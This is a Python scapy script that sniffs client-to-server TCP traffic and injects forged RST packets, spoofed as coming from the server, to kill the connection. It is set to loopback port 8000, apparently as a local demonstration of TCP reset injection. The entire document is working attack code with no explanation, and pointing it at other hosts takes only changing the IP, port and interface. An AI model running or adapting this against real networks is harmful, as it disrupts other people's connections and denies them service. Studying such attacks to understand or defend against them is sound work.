from scapy.all import *

DEFAULT_WINDOW_SIZE = 2052

def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return f

def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def send_reset(iface):
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        rst_seq = ack
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "seq": rst_seq,    
            },
        )

        send(p, verbose=0, iface=iface)

    return f


if __name__ == "__main__":
    iface = "lo"
    ip = "127.0.0.1"
    server_port = 8000

    log("Starting sniff...")
    conf.L3socket=L3RawSocket
    t = sniff(
        iface=iface,
        count=50,
        prn=send_reset(iface),
        lfilter=is_packet_tcp_client_to_server(ip, server_port, ip)
    )
